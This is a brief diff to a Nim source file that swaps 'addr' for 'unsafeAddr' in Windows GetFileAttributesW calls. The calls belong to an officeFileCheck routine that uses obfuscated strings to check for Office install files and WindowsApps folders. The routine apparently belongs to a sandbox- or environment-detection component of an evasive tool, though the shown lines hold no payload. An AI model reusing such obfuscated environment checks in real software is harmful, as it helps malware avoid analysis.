@@ -2692,7 +2692,7 @@ proc officeFileCheck(): void =
     var AppXManifest: string = obf(r"C:\Program Files\Microsoft Office\AppXManifest.xml")
     var dwAttributes: DWORD
     let wideAppXManifest = newWideCString(AppXManifest)
-    dwAttributes = GetFileAttributesW(cast[LPCWSTR](addr wideAppXManifest))
+    dwAttributes = GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideAppXManifest))
     if (dwAttributes != INVALID_FILE_ATTRIBUTES):
         fileCount += 1
         when defined(verbose):
@@ -2704,7 +2704,7 @@ proc officeFileCheck(): void =
         # check if file "C:\Program Files\Microsoft Office\RappelZapp.xml" exists
         var RappelZapp: string = obf(r"C:\Program Files\Microsoft Office\RappelZapp.xml")
         let wideRappelZapp = newWideCString(RappelZapp)
-        dwAttributes = GetFileAttributesW(cast[LPCWSTR](addr wideRappelZapp))
+        dwAttributes = GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideRappelZapp))
         if dwAttributes != INVALID_FILE_ATTRIBUTES:
             fileCount += 1
             when defined(verbose):
@@ -2718,7 +2718,7 @@ proc officeFileCheck(): void =
     var WindowsApps2: string = obf(r"C:\PROGRA~2\WindowsApps")
     let wideWindowsApps = newWideCString(WindowsApps)
     let wideWindowsApps2 = newWideCString(WindowsApps2)
-    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](addr wideWindowsApps)) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](addr wideWindowsApps2))):
+    if (INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideWindowsApps)) or INVALID_FILE_ATTRIBUTES != GetFileAttributesW(cast[LPCWSTR](unsafeAddr wideWindowsApps2))):
         fileCount += 1
         when defined(verbose):
             echo obf("[*] File: ") & WindowsApps & obf(" or ") & WindowsApps2 & obf(" exists")
